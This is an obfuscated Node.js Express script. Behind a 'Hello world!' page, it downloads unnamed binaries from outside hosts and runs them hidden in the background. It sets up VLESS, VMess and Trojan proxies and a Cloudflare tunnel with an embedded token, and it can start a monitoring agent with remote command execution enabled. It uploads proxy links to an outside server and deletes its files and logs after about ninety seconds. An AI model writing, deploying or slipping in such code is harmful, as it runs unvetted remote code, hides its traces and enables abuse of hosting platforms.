const _0x5867e5=_0x1a7f;(function(_0x438c60,_0x110798){const _0x1e926a=_0x1a7f,_0x5c6f3a=_0x438c60();while(!![]){try{const _0x2b4bfe=parseInt(_0x1e926a(0x13a))/0x1*(-parseInt(_0x1e926a(0x179))/0x2)+-parseInt(_0x1e926a(0x161))/0x3+-parseInt(_0x1e926a(0x198))/0x4+parseInt(_0x1e926a(0x176))/0x5*(parseInt(_0x1e926a(0x11b))/0x6)+-parseInt(_0x1e926a(0x13f))/0x7*(-parseInt(_0x1e926a(0x1ae))/0x8)+parseInt(_0x1e926a(0x1a2))/0x9*(-parseInt(_0x1e926a(0x145))/0xa)+-parseInt(_0x1e926a(0x126))/0xb*(-parseInt(_0x1e926a(0x132))/0xc);if(_0x2b4bfe===_0x110798)break;else _0x5c6f3a['push'](_0x5c6f3a['shift']());}catch(_0x496520){_0x5c6f3a['push'](_0x5c6f3a['shift']());}}}(_0x2fde,0xd40a7));const express=require(_0x5867e5(0x185)),app=express(),axios=require(_0x5867e5(0x14c)),os=require('os'),fs=require('fs'),path=require(_0x5867e5(0x139)),{promisify}=require(_0x5867e5(0x117)),exec=promisify(require(_0x5867e5(0x142))[_0x5867e5(0x1c1)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x5867e5(0x12a)][_0x5867e5(0x19a)]||'',PROJECT_URL=process[_0x5867e5(0x12a)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x5867e5(0x12a)][_0x5867e5(0x115)]||![],FILE_PATH=process[_0x5867e5(0x12a)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x5867e5(0x12a)]['SUB_PATH']||'zuofeng',PORT=process[_0x5867e5(0x12a)][_0x5867e5(0x160)]||process[_0x5867e5(0x12a)]['PORT']||0xbb8,UUID=process[_0x5867e5(0x12a)][_0x5867e5(0x151)]||_0x5867e5(0x199),NEZHA_SERVER=process[_0x5867e5(0x12a)][_0x5867e5(0x1b6)]||'',NEZHA_PORT=process[_0x5867e5(0x12a)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5867e5(0x12a)][_0x5867e5(0x1d7)]||'',ARGO_DOMAIN=process[_0x5867e5(0x12a)]['ARGO_DOMAIN']||_0x5867e5(0x1ba),ARGO_AUTH=process[_0x5867e5(0x12a)]['ARGO_AUTH']||_0x5867e5(0x175),ARGO_PORT=process[_0x5867e5(0x12a)][_0x5867e5(0x1b9)]||0x1f41,CFIP=process[_0x5867e5(0x12a)][_0x5867e5(0x134)]||_0x5867e5(0x11f),CFPORT=process[_0x5867e5(0x12a)][_0x5867e5(0x1c6)]||0x1bb,NAME=process['env'][_0x5867e5(0x1d6)]||_0x5867e5(0x1d2);!fs[_0x5867e5(0x1b8)](FILE_PATH)?(fs[_0x5867e5(0x18e)](FILE_PATH),console[_0x5867e5(0x1c9)](FILE_PATH+'\x20is\x20created')):console[_0x5867e5(0x1c9)](FILE_PATH+_0x5867e5(0x1b5));function generateRandomName(){const _0x195498=_0x5867e5,_0x49138c=_0x195498(0x19c);let _0x2f77f8='';for(let _0x32c0e9=0x0;_0x32c0e9<0x6;_0x32c0e9++){_0x2f77f8+=_0x49138c['charAt'](Math['floor'](Math[_0x195498(0x1c0)]()*_0x49138c[_0x195498(0x195)]));}return _0x2f77f8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5867e5(0x177)](FILE_PATH,npmName),phpPath=path[_0x5867e5(0x177)](FILE_PATH,phpName),webPath=path[_0x5867e5(0x177)](FILE_PATH,webName),botPath=path[_0x5867e5(0x177)](FILE_PATH,botName),subPath=path[_0x5867e5(0x177)](FILE_PATH,_0x5867e5(0x167)),listPath=path[_0x5867e5(0x177)](FILE_PATH,_0x5867e5(0x1bd)),bootLogPath=path[_0x5867e5(0x177)](FILE_PATH,_0x5867e5(0x136)),configPath=path[_0x5867e5(0x177)](FILE_PATH,_0x5867e5(0x169));function deleteNodes(){const _0x3b4685=_0x5867e5;try{if(!UPLOAD_URL)return;if(!fs[_0x3b4685(0x1b8)](subPath))return;let _0x264728;try{_0x264728=fs['readFileSync'](subPath,_0x3b4685(0x12b));}catch{return null;}const _0x3b0d14=Buffer['from'](_0x264728,'base64')[_0x3b4685(0x118)](_0x3b4685(0x12b)),_0x1af8a7=_0x3b0d14[_0x3b4685(0x19d)]('\x0a')[_0x3b4685(0x181)](_0xc78cfa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b4685(0x1a0)](_0xc78cfa));if(_0x1af8a7[_0x3b4685(0x195)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3b4685(0x116),JSON['stringify']({'nodes':_0x1af8a7}),{'headers':{'Content-Type':_0x3b4685(0x19b)}})[_0x3b4685(0x157)](_0x53e306=>{return null;}),null;}catch(_0x4417ea){return null;}}function cleanupOldFiles(){const _0x4543bd=_0x5867e5;try{const _0x5820e5=fs[_0x4543bd(0x154)](FILE_PATH);_0x5820e5[_0x4543bd(0x11e)](_0x1dd8e9=>{const _0x3a8fd7=_0x4543bd,_0x6540c2=path[_0x3a8fd7(0x177)](FILE_PATH,_0x1dd8e9);try{const _0x1530bc=fs[_0x3a8fd7(0x1cd)](_0x6540c2);_0x1530bc[_0x3a8fd7(0x15a)]()&&fs[_0x3a8fd7(0x197)](_0x6540c2);}catch(_0x4e80b1){}});}catch(_0x4daf87){}}app['get']('/',function(_0x36063a,_0x45de58){const _0x21a7a4=_0x5867e5;_0x45de58[_0x21a7a4(0x182)](_0x21a7a4(0x16d));});async function generateConfig(){const _0x1a8129=_0x5867e5,_0x3fc1f0={'log':{'access':_0x1a8129(0x1c2),'error':_0x1a8129(0x1c2),'loglevel':_0x1a8129(0x1c7)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a8129(0x187),'settings':{'clients':[{'id':UUID,'flow':_0x1a8129(0x11d)}],'decryption':_0x1a8129(0x1c7),'fallbacks':[{'dest':0xbb9},{'path':_0x1a8129(0x14b),'dest':0xbba},{'path':_0x1a8129(0x171),'dest':0xbbb},{'path':_0x1a8129(0x1b0),'dest':0xbbc}]},'streamSettings':{'network':_0x1a8129(0x16b)}},{'port':0xbb9,'listen':_0x1a8129(0x19e),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1a8129(0x16b),'security':_0x1a8129(0x1c7)}},{'port':0xbba,'listen':_0x1a8129(0x19e),'protocol':_0x1a8129(0x187),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1a8129(0x1c7)},'streamSettings':{'network':'ws','security':_0x1a8129(0x1c7),'wsSettings':{'path':_0x1a8129(0x14b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8129(0x191),_0x1a8129(0x1af),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1a8129(0x19e),'protocol':_0x1a8129(0x1a8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1a8129(0x171)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8129(0x191),_0x1a8129(0x1af),_0x1a8129(0x1a3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1a8129(0x19e),'protocol':_0x1a8129(0x1d3),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1a8129(0x1b0)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8129(0x191),_0x1a8129(0x1af),_0x1a8129(0x1a3)],'metadataOnly':![]}}],'dns':{'servers':[_0x1a8129(0x14d)]},'outbounds':[{'protocol':'freedom','tag':_0x1a8129(0x1d4)},{'protocol':'blackhole','tag':_0x1a8129(0x1be)}]};fs[_0x1a8129(0x1b4)](path[_0x1a8129(0x177)](FILE_PATH,_0x1a8129(0x169)),JSON['stringify'](_0x3fc1f0,null,0x2));}function _0x2fde(){const _0x3a2136=['mkdirSync','\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','http','https://arm64.ssss.nyc.mn/v1','error','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','length','tunnel.json','unlinkSync','117788HZpJrk','59531c29-ba6a-4251-b055-9e1da4611e3c','UPLOAD_URL','application/json','abcdefghijklmnopqrstuvwxyz','split','127.0.0.1','all','test','stringify','27aaGcSA','quic','443','arm','match','/tunnel.yml\x20run','vmess','\x0aclient_secret:\x20','Unhandled\x20error\x20in\x20startserver:','arch','substring','\x20>/dev/null\x202>&1\x20&','184MKWLPG','tls','/trojan-argo','Download\x20','set','Nodes\x20uploaded\x20successfully','writeFileSync','\x20already\x20exists','NEZHA_SERVER','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','existsSync','ARGO_PORT','railway.wans.netlib.re','pkill\x20-f\x20\x22[','\x20-c\x20','list.txt','block','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','random','exec','/dev/null','automatic\x20access\x20task\x20added\x20successfully','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Empowerment\x20failed\x20for\x20','CFPORT','none','base64','log','taskkill\x20/f\x20/im\x20','then','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','statSync','\x22\x20>\x20/dev/null\x202>&1','charAt','pop','clear','railway','trojan','direct','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NAME','NEZHA_KEY','https://arm64.ssss.nyc.mn/agent','8443','AUTO_ACCESS','/api/delete-nodes','util','toString','text/plain;\x20charset=utf-8','fileName','5417844tpxImL','https://arm64.ssss.nyc.mn/bot','xtls-rprx-vision','forEach','cf.090227.xyz','includes','Subscription\x20uploaded\x20successfully','unshift','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20failed:\x20','3498935lAMnns','?security=tls&sni=','data','close','env','utf-8','Skipping\x20adding\x20automatic\x20access\x20task','true','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2053','push','?encryption=none&security=tls&sni=','36NjDcEW','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFIP','platform','boot.log','win32','amd','path','27wUFlYo','App\x20is\x20running','https://amd64.ssss.nyc.mn/v1','&path=%2Ftrojan-argo%3Fed%3D2560#','Error\x20executing\x20command:\x20','485681BBQNuD','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/web','child_process','\x20-s\x20','https://amd64.ssss.nyc.mn/agent','2433670aJSEbW','ArgoDomain:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','post','basename','Error\x20in\x20startserver:','/vless-argo','axios','https+local://8.8.8.8/dns-query','ARGO_DOMAIN:','Error\x20reading\x20boot.log:','from','UUID','tunnel.yml','https://oooo.serv00.net/add-url','readdirSync','aarch64','.exe\x20>\x20nul\x202>&1','catch','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Add\x20automatic\x20access\x20task\x20faild:\x20','isFile','readFileSync','has','response','&path=%2Fvless-argo%3Fed%3D2560#','finish','SERVER_PORT','1235859FoNnfG','\x0a\x20\x20\x20\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','--tls','/vmess-argo?ed=2560','chmod','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','config.json','/api/add-subscriptions','tcp','false','Hello\x20world!','message','createWriteStream','fileUrl','/vmess-argo','TunnelSecret','map','status','eyJhIjoiNTAyODU3NmMxOTVhNTBlMGE0NGY5ZTM0YWNhZmQwM2UiLCJ0IjoiYjQzMGU2NDMtZDFmMi00MjBlLWE1NjgtYTdlNTJkZjhiNWZmIiwicyI6IllUQXdORFF3TW1VdE4yUmxOeTAwTW1FMExUazNZelV0TkdSbE1UQTFNekEwT1RsbCJ9','5uTRMyF','join','http\x20server\x20is\x20running\x20on\x20port:','104668xDUzdr','\x0a\x20\x20\x0atrojan://','2096','Content-Type','stream','del\x20/f\x20/q\x20','nohup\x20','php\x20running\x20error:\x20','filter','send','\x20is\x20running','NEZHA\x20variable\x20is\x20empty,skip\x20running','express','get','vless','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','https://amd64.ssss.nyc.mn/bot','trim','firefox','\x20-p\x20'];_0x2fde=function(){return _0x3a2136;};return _0x2fde();}function getSystemArchitecture(){const _0x587602=_0x5867e5,_0x3c6bca=os[_0x587602(0x1ab)]();return _0x3c6bca===_0x587602(0x1a5)||_0x3c6bca==='arm64'||_0x3c6bca===_0x587602(0x155)?'arm':_0x587602(0x138);}function downloadFile(_0x3fbe21,_0x28a791,_0x51d4e9){const _0x2a5b5c=_0x5867e5,_0x265bc8=_0x3fbe21;!fs[_0x2a5b5c(0x1b8)](FILE_PATH)&&fs[_0x2a5b5c(0x18e)](FILE_PATH,{'recursive':!![]});const _0x2183d4=fs[_0x2a5b5c(0x16f)](_0x265bc8);axios({'method':_0x2a5b5c(0x186),'url':_0x28a791,'responseType':_0x2a5b5c(0x17d)})[_0x2a5b5c(0x1cb)](_0x423cf5=>{const _0x2057be=_0x2a5b5c;_0x423cf5[_0x2057be(0x128)]['pipe'](_0x2183d4),_0x2183d4['on'](_0x2057be(0x15f),()=>{const _0x1b834f=_0x2057be;_0x2183d4[_0x1b834f(0x129)](),console['log'](_0x1b834f(0x1b1)+path['basename'](_0x265bc8)+'\x20successfully'),_0x51d4e9(null,_0x265bc8);}),_0x2183d4['on']('error',_0x4c43d4=>{const _0x282ece=_0x2057be;fs[_0x282ece(0x189)](_0x265bc8,()=>{});const _0x378e75='Download\x20'+path[_0x282ece(0x149)](_0x265bc8)+_0x282ece(0x125)+_0x4c43d4['message'];console['error'](_0x378e75),_0x51d4e9(_0x378e75);});})['catch'](_0x575c0b=>{const _0x3343d4=_0x2a5b5c,_0x54e8bc=_0x3343d4(0x1b1)+path[_0x3343d4(0x149)](_0x265bc8)+_0x3343d4(0x125)+_0x575c0b['message'];console[_0x3343d4(0x193)](_0x54e8bc),_0x51d4e9(_0x54e8bc);});}async function downloadFilesAndRun(){const _0x55c7ef=_0x5867e5,_0x23058f=getSystemArchitecture(),_0x2b1dc5=getFilesForArchitecture(_0x23058f);if(_0x2b1dc5[_0x55c7ef(0x195)]===0x0){console[_0x55c7ef(0x1c9)](_0x55c7ef(0x190));return;}const _0x237801=_0x2b1dc5[_0x55c7ef(0x173)](_0x39b1b4=>{return new Promise((_0x1e5a47,_0x22df97)=>{const _0x1443a9=_0x1a7f;downloadFile(_0x39b1b4[_0x1443a9(0x11a)],_0x39b1b4[_0x1443a9(0x170)],(_0x2d0a55,_0x2872b5)=>{_0x2d0a55?_0x22df97(_0x2d0a55):_0x1e5a47(_0x2872b5);});});});try{await Promise[_0x55c7ef(0x19f)](_0x237801);}catch(_0x276c83){console['error']('Error\x20downloading\x20files:',_0x276c83);return;}function _0x2c2e9e(_0x177efd){const _0x5dfca8=0x1fd;_0x177efd['forEach'](_0x5c73bc=>{const _0x5a15c2=_0x1a7f;fs['existsSync'](_0x5c73bc)&&fs[_0x5a15c2(0x166)](_0x5c73bc,_0x5dfca8,_0xb9a753=>{const _0x14d0e4=_0x5a15c2;_0xb9a753?console[_0x14d0e4(0x193)](_0x14d0e4(0x1c5)+_0x5c73bc+':\x20'+_0xb9a753):console[_0x14d0e4(0x1c9)]('Empowerment\x20success\x20for\x20'+_0x5c73bc+':\x20'+_0x5dfca8['toString'](0x8));});});}const _0x45f410=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2c2e9e(_0x45f410);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x510332=NEZHA_SERVER[_0x55c7ef(0x120)](':')?NEZHA_SERVER['split'](':')[_0x55c7ef(0x1d0)]():'',_0x33197c=new Set([_0x55c7ef(0x1a4),_0x55c7ef(0x114),_0x55c7ef(0x17b),'2087','2083',_0x55c7ef(0x12f)]),_0x413555=_0x33197c[_0x55c7ef(0x15c)](_0x510332)?_0x55c7ef(0x12d):_0x55c7ef(0x16c),_0x4b61be=_0x55c7ef(0x1a9)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x55c7ef(0x188)+_0x413555+_0x55c7ef(0x1d5)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x4b61be);const _0x3969a7=_0x55c7ef(0x17f)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x55c7ef(0x133);try{await exec(_0x3969a7),console['log'](phpName+_0x55c7ef(0x183)),await new Promise(_0x4e9f3d=>setTimeout(_0x4e9f3d,0x3e8));}catch(_0x420cb7){console[_0x55c7ef(0x193)](_0x55c7ef(0x180)+_0x420cb7);}}else{let _0x347530='';const _0x2e3293=['443',_0x55c7ef(0x114),_0x55c7ef(0x17b),'2087','2083',_0x55c7ef(0x12f)];_0x2e3293[_0x55c7ef(0x120)](NEZHA_PORT)&&(_0x347530=_0x55c7ef(0x164));const _0x1a9375=_0x55c7ef(0x17f)+npmPath+_0x55c7ef(0x143)+NEZHA_SERVER+':'+NEZHA_PORT+_0x55c7ef(0x18d)+NEZHA_KEY+'\x20'+_0x347530+_0x55c7ef(0x1cc);try{await exec(_0x1a9375),console[_0x55c7ef(0x1c9)](npmName+_0x55c7ef(0x183)),await new Promise(_0x57c191=>setTimeout(_0x57c191,0x3e8));}catch(_0x3d4fc4){console[_0x55c7ef(0x193)]('npm\x20running\x20error:\x20'+_0x3d4fc4);}}}else console[_0x55c7ef(0x1c9)](_0x55c7ef(0x184));const _0x302db0=_0x55c7ef(0x17f)+webPath+_0x55c7ef(0x1bc)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x302db0),console['log'](webName+_0x55c7ef(0x183)),await new Promise(_0x40ed6e=>setTimeout(_0x40ed6e,0x3e8));}catch(_0x384bb4){console[_0x55c7ef(0x193)]('web\x20running\x20error:\x20'+_0x384bb4);}if(fs[_0x55c7ef(0x1b8)](botPath)){let _0x160a67;if(ARGO_AUTH[_0x55c7ef(0x1a6)](/^[A-Z0-9a-z=]{120,250}$/))_0x160a67=_0x55c7ef(0x147)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x160a67=_0x55c7ef(0x12e)+FILE_PATH+_0x55c7ef(0x1a7):_0x160a67=_0x55c7ef(0x168)+FILE_PATH+_0x55c7ef(0x158)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x160a67+_0x55c7ef(0x1ad)),console[_0x55c7ef(0x1c9)](botName+_0x55c7ef(0x183)),await new Promise(_0x5bcdd2=>setTimeout(_0x5bcdd2,0x7d0));}catch(_0x267074){console['error'](_0x55c7ef(0x13e)+_0x267074);}}await new Promise(_0x2aacc7=>setTimeout(_0x2aacc7,0x1388));}function getFilesForArchitecture(_0x4f060c){const _0xa925bf=_0x5867e5;let _0x44bd11;_0x4f060c==='arm'?_0x44bd11=[{'fileName':webPath,'fileUrl':_0xa925bf(0x141)},{'fileName':botPath,'fileUrl':_0xa925bf(0x11c)}]:_0x44bd11=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0xa925bf(0x18a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4647b5=_0x4f060c==='arm'?_0xa925bf(0x113):_0xa925bf(0x144);_0x44bd11[_0xa925bf(0x122)]({'fileName':npmPath,'fileUrl':_0x4647b5});}else{const _0x570a6e=_0x4f060c===_0xa925bf(0x1a5)?_0xa925bf(0x192):_0xa925bf(0x13c);_0x44bd11[_0xa925bf(0x122)]({'fileName':phpPath,'fileUrl':_0x570a6e});}}return _0x44bd11;}function argoType(){const _0x45ea28=_0x5867e5;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x45ea28(0x1c9)](_0x45ea28(0x163));return;}if(ARGO_AUTH[_0x45ea28(0x120)](_0x45ea28(0x172))){fs[_0x45ea28(0x1b4)](path['join'](FILE_PATH,_0x45ea28(0x196)),ARGO_AUTH);const _0x2ae9f0='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x45ea28(0x177)](FILE_PATH,_0x45ea28(0x196))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x45ea28(0x124)+ARGO_PORT+_0x45ea28(0x123);fs['writeFileSync'](path[_0x45ea28(0x177)](FILE_PATH,_0x45ea28(0x152)),_0x2ae9f0);}else console[_0x45ea28(0x1c9)](_0x45ea28(0x1bf));}argoType();async function extractDomains(){const _0x85cce6=_0x5867e5;let _0x3588a4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3588a4=ARGO_DOMAIN,console[_0x85cce6(0x1c9)](_0x85cce6(0x14e),_0x3588a4),await _0x3d0906(_0x3588a4);else try{const _0x30a1e5=fs[_0x85cce6(0x15b)](path[_0x85cce6(0x177)](FILE_PATH,'boot.log'),_0x85cce6(0x12b)),_0xb2dc6a=_0x30a1e5[_0x85cce6(0x19d)]('\x0a'),_0x3f985e=[];_0xb2dc6a[_0x85cce6(0x11e)](_0x4c8d2c=>{const _0x4c6f9e=_0x85cce6,_0x55d8d8=_0x4c8d2c[_0x4c6f9e(0x1a6)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x55d8d8){const _0x34e5e1=_0x55d8d8[0x1];_0x3f985e[_0x4c6f9e(0x130)](_0x34e5e1);}});if(_0x3f985e[_0x85cce6(0x195)]>0x0)_0x3588a4=_0x3f985e[0x0],console[_0x85cce6(0x1c9)](_0x85cce6(0x146),_0x3588a4),await _0x3d0906(_0x3588a4);else{console['log'](_0x85cce6(0x194)),fs['unlinkSync'](path[_0x85cce6(0x177)](FILE_PATH,_0x85cce6(0x136)));async function _0x1e4b09(){const _0x2a0e3f=_0x85cce6;try{process[_0x2a0e3f(0x135)]===_0x2a0e3f(0x137)?await exec(_0x2a0e3f(0x1ca)+botName+_0x2a0e3f(0x156)):await exec(_0x2a0e3f(0x1bb)+botName[_0x2a0e3f(0x1cf)](0x0)+']'+botName[_0x2a0e3f(0x1ac)](0x1)+_0x2a0e3f(0x1ce));}catch(_0x35fb7b){}}_0x1e4b09(),await new Promise(_0x130142=>setTimeout(_0x130142,0xbb8));const _0x5cf909=_0x85cce6(0x168)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5cf909+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x85cce6(0x183)),await new Promise(_0x13d880=>setTimeout(_0x13d880,0xbb8)),await extractDomains();}catch(_0x541664){console[_0x85cce6(0x193)](_0x85cce6(0x13e)+_0x541664);}}}catch(_0x499507){console[_0x85cce6(0x193)](_0x85cce6(0x14f),_0x499507);}async function _0x3d0906(_0x41b314){const _0xbd005f=_0x85cce6,_0x3bb134=execSync(_0xbd005f(0x1c4),{'encoding':'utf-8'}),_0x2db251=_0x3bb134[_0xbd005f(0x18b)](),_0x1bf76b=NAME?NAME+'-'+_0x2db251:_0x2db251;return new Promise(_0x53d86a=>{setTimeout(()=>{const _0x529089=_0x1a7f,_0x5ea4ca={'v':'2','ps':''+_0x1bf76b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x41b314,'path':_0x529089(0x165),'tls':_0x529089(0x1af),'sni':_0x41b314,'alpn':'','fp':_0x529089(0x18c)},_0x121de6='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x529089(0x131)+_0x41b314+'&fp=firefox&type=ws&host='+_0x41b314+_0x529089(0x15e)+_0x1bf76b+'\x0a\x20\x20\x0avmess://'+Buffer[_0x529089(0x150)](JSON[_0x529089(0x1a1)](_0x5ea4ca))[_0x529089(0x118)]('base64')+_0x529089(0x17a)+UUID+'@'+CFIP+':'+CFPORT+_0x529089(0x127)+_0x41b314+'&fp=firefox&type=ws&host='+_0x41b314+_0x529089(0x13d)+_0x1bf76b+_0x529089(0x162);console['log'](Buffer[_0x529089(0x150)](_0x121de6)['toString'](_0x529089(0x1c8))),fs[_0x529089(0x1b4)](subPath,Buffer[_0x529089(0x150)](_0x121de6)[_0x529089(0x118)](_0x529089(0x1c8))),console[_0x529089(0x1c9)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x529089(0x186)]('/'+SUB_PATH,(_0x25c0a0,_0x277e12)=>{const _0x3a9f4d=_0x529089,_0x5cb1ce=Buffer[_0x3a9f4d(0x150)](_0x121de6)['toString']('base64');_0x277e12[_0x3a9f4d(0x1b2)](_0x3a9f4d(0x17c),_0x3a9f4d(0x119)),_0x277e12[_0x3a9f4d(0x182)](_0x5cb1ce);}),_0x53d86a(_0x121de6);},0x7d0);});}}async function uploadNodes(){const _0x1d31be=_0x5867e5;if(UPLOAD_URL&&PROJECT_URL){const _0x391783=PROJECT_URL+'/'+SUB_PATH,_0x18862c={'subscription':[_0x391783]};try{const _0x4abc0b=await axios['post'](UPLOAD_URL+_0x1d31be(0x16a),_0x18862c,{'headers':{'Content-Type':_0x1d31be(0x19b)}});return _0x4abc0b&&_0x4abc0b['status']===0xc8?(console[_0x1d31be(0x1c9)](_0x1d31be(0x121)),_0x4abc0b):null;}catch(_0x1c787a){if(_0x1c787a[_0x1d31be(0x15d)]){if(_0x1c787a[_0x1d31be(0x15d)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1d31be(0x1b8)](listPath))return;const _0x55627f=fs[_0x1d31be(0x15b)](listPath,_0x1d31be(0x12b)),_0x4f5e21=_0x55627f[_0x1d31be(0x19d)]('\x0a')[_0x1d31be(0x181)](_0xeb2d77=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xeb2d77));if(_0x4f5e21[_0x1d31be(0x195)]===0x0)return;const _0x4b9088=JSON[_0x1d31be(0x1a1)]({'nodes':_0x4f5e21});try{const _0x3fdfac=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x4b9088,{'headers':{'Content-Type':'application/json'}});return _0x3fdfac&&_0x3fdfac[_0x1d31be(0x174)]===0xc8?(console[_0x1d31be(0x1c9)](_0x1d31be(0x1b3)),_0x3fdfac):null;}catch(_0x12f5a8){return null;}}else return;}}function _0x1a7f(_0x388393,_0x25c1cc){const _0x2fded4=_0x2fde();return _0x1a7f=function(_0x1a7fe2,_0x2aed73){_0x1a7fe2=_0x1a7fe2-0x113;let _0x37e87b=_0x2fded4[_0x1a7fe2];return _0x37e87b;},_0x1a7f(_0x388393,_0x25c1cc);}function cleanFiles(){setTimeout(()=>{const _0x207ca7=_0x1a7f,_0x4bb21d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4bb21d[_0x207ca7(0x130)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4bb21d[_0x207ca7(0x130)](phpPath);process['platform']===_0x207ca7(0x137)?exec(_0x207ca7(0x17e)+_0x4bb21d[_0x207ca7(0x177)]('\x20')+_0x207ca7(0x18f),_0xafc867=>{const _0x31c4cc=_0x207ca7;console[_0x31c4cc(0x1d1)](),console[_0x31c4cc(0x1c9)](_0x31c4cc(0x13b)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x207ca7(0x140)+_0x4bb21d['join']('\x20')+'\x20>/dev/null\x202>&1',_0x325248=>{const _0xa8877c=_0x207ca7;console[_0xa8877c(0x1d1)](),console[_0xa8877c(0x1c9)](_0xa8877c(0x13b)),console[_0xa8877c(0x1c9)](_0xa8877c(0x1b7));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x397e86=_0x5867e5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x397e86(0x1c9)](_0x397e86(0x12c));return;}try{const _0x44af37=await axios[_0x397e86(0x148)](_0x397e86(0x153),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x397e86(0x19b)}});return console['log'](_0x397e86(0x1c3)),_0x44af37;}catch(_0x59fd32){return console['error'](_0x397e86(0x159)+_0x59fd32[_0x397e86(0x16e)]),null;}}async function startserver(){const _0x54d199=_0x5867e5;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3faa38){console[_0x54d199(0x193)](_0x54d199(0x14a),_0x3faa38);}}startserver()[_0x5867e5(0x157)](_0x3cac48=>{const _0x229b10=_0x5867e5;console[_0x229b10(0x193)](_0x229b10(0x1aa),_0x3cac48);}),app['listen'](PORT,()=>console[_0x5867e5(0x1c9)](_0x5867e5(0x178)+PORT+'!'));
